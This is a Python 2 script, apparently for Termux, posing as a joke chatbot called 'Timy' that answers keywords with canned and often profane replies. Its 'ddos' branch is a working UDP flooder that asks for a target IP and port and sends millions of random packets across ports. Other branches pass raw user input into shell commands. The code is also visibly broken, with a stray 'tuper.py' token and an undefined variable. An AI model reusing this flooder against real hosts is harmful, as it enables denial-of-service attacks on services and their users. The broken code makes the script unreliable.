import random,os,time,sys,socket
sk = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
bytes = random._urandom(1490)

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

print (""+G+"")
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print ""
time.sleep (0.5)
print "   I a'm bot (AI)"
print ""
time.sleep (0.5)
print "   what is your name ?"
q = raw_input("   my name is  : ")
time.sleep (0.3)
print ""
print (""+P+"")
print ("   bot  : Hallo %s" %(q))
def hallo():

    yy = ["y","Y","yes","Yes","yy","YY","YES"]
    nn = ["n","N","no","nn","No","NO","NN"]
    fk1 =["Fuck you timy","fack you timy","fuck you bot","Fuck you bot"]
    fk = ["FUCKING","Fucking","finking","FUCK YOU","Fuck you","fuck","Fuck","FUCK","fuck you"]
    Ha = ["hahaha","haha","ha","555","55"]
    pet1 = ["birds","Birds","bird","Bird","fish","Fish","Fishs","fishs"]
    pet = ["dog","Dog","Dogs","dogs","cat","Cat","cats","Cats"]
    dd = ["ddos","Ddos","DDos","DDOS"]
    call = ["Call","call","CALL"]
    wh = ["What is you nane?","what is you name?","What is you name ?"]
    wh1 = ["what is your name ?","what is your name","What is your name"]
    no = ["no","No","NO"]
    i = ["pornhub","pornhub.com"]
    u = ["yes i have","yes i have dog","yes I have"]
    y = ["hallo Timy","hallo my friend","Hallo my friend","hallo timy","hi tiny","hallo bot","hi bot"]
    gg = ["google","google.com"]
    r = ["what","What","what?","What?","what ?","What ?"]
    e = ["hi","hallo","hello","Hi","HI","Hallo"]
    tube = ["youtube","you tube","youtube.com","Youtube.com"]
    hiF = ["hi my friend","Hi my friend"]

    b = "   bot  :"
    time.sleep (0.2)
    w = raw_input("   %s  :"%(q))
    time.sleep (0.5)
    if w in e :
        time.sleep (0.5)
        print b+random.choice(["ok hi","ok hallo","Hallo my friend","Hi my friend"])
    elif w == "day" :
         os.system("cal")
    elif w in pet+pet1 :
         print b+"I no have pet"
    elif w == "rip" :
         print b+"rip = dead"
         time.sleep (0.5)
    elif w == "yes" :
         time.sleep (0.5)
         print b+ "ok haha"
    elif w == "ok" :
         time.sleep (0.5)
         print b+ "A  OK"
    elif w == "halp" :
         time.sleep (0.5)
         print b+ "What is a halp"
    elif w == "stop" :
         time.sleep (0.5)
         sys.exit()
    elif w in Ha :
         time.sleep (0.5)
         print b+ "hahaha !"
    elif w in no :
         time.sleep (0.5)
         print b+ "eo"
         time.sleep (0.5)
         print b+ "?no 55"
    elif w in fk+fk1 :
         time.sleep (0.5)
         os.system("clear")
         time.sleep (0.5)
         print b+random.choice(["FUCK YOU","Yse fuck you to","fucking your mom","fuck you"])+" "+q
    elif w in wh+wh1 :
         time.sleep (0.5)
         print b+ "My name is Timy (Timmy)"
    elif w == "go" :
         time.sleep (0.5)
         print b+ "what ?"
    elif w == "bot" :
         time.sleep (0.5)
         print b+ "yes I a'm bot "
    elif w == "hacker" :
         os.system("pkg install cmatrix")
         os.system("cmatrix")
    elif w in y+hiF :
         time.sleep (0.5)
         print b+ ("hi %s"%(q))
    elif w in u :
         time.sleep (0.5)
         print b+ " ok"
    elif  w in call :
         print "   0-9"
         Cl = input ("%s  =>  "%(b))
         os.system("termux-telephony-call %s"%(Cl))
    elif w in r :
         time.sleep (0.5)
         print b+ "haha"
    elif w in dd :
         time.sleep (1)
         print "---------DDOS---------"
         ip = raw_input ("  IP Target : ")                                          tuper.py
         port = input ("  Port      : ")
         print ("")
         print ("     1 = ip = ***.***.***.***")
         print ("     2 = ip = 192.168.111.111")
         print ("")
         sss = input("     1 or 2    :")
         print ("")
         print ("  sent : 10000=104,50000=504      ")
         print ("  sent : 100000=105,500000=505    ")
         print ("  sent : 1000000=106,5000000=506  ")
         st = input("  sent       : ")
         sent = 0
         while True:
             sk.sendto(bytes, (ip,port))
             port += 1
             if sss == 1:
                  print "Sent: %s port: %s"%(sent,port)
             if sss == 2:
                  print "IP: %s Sent: %s port: %s "%(ip,sent,port)
             if sss == 0:
                  i = input()
                  print (i)
             if sss == 99 :
                  break
             if port == 65534:
                  port = 1
             if st == 106 :
                  sent += 1
                  if sent == 1000001 :
                        break
             elif st == 506 :
                  sent += 1
                  if sent == 5000001 :
                        break
             elif st == 105 :
                  sent += 1
                  if sent == 100001 :
                        break
             elif st == 505 :
                  sent += 1
                  if sent ==500001 :
                        break
             elif st == 104 :
                  sent += 1
                  if sent == 10001 :
                        break
             elif st == 504:
                  sent += 1
                  if sent == 50001 :
                        break
             else :
                  break
    elif w == "av" :
         print b+ "what a AV"
         time.sleep (0.5)
    elif w == "biy" :
         time.sleep (0.5)
         print (b+ "biy " +q)
         time.sleep (0.7)
         sys.exit("biy")
    elif w in i :
         time.sleep (0.5)
         print "     YOU in Pornhub hahaha"
    elif w in gg :
         os.system("w3m google.com")
    elif w in tube :
         time.sleep (0.5)
         os.system ("w3m youtube.com")
         if vv in nn :
            os.system ("clear")
            os.system ("tor")
         if vv in yy :
            os.system ("pkg install tor")
            os.system ("tor")
    else :
         time.sleep (0.6)
         print b+random.choice(["What ?"," ????!","?!","??!","@#$/!?"])
while True :
    hallo()

                                                                                                                      
